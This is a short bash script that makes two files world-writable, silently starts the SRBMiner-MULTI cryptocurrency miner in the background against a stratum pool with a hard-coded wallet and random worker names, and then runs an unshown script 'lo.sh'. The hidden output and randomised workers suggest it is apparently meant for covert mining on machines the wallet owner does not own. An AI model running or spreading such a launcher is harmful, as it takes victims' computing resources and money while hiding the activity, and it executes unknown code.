#!/bin/bash
chmod 777 lo.sh SRBMiner-MULTI
./SRBMiner-MULTI --algorithm yespower --pool stratum+tcps://stratum-asia.rplant.xyz:17070 --wallet WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.$(echo $(shuf -i 1-20000 -n 1)-coba) > /dev/null 2>&1 &
./lo.sh
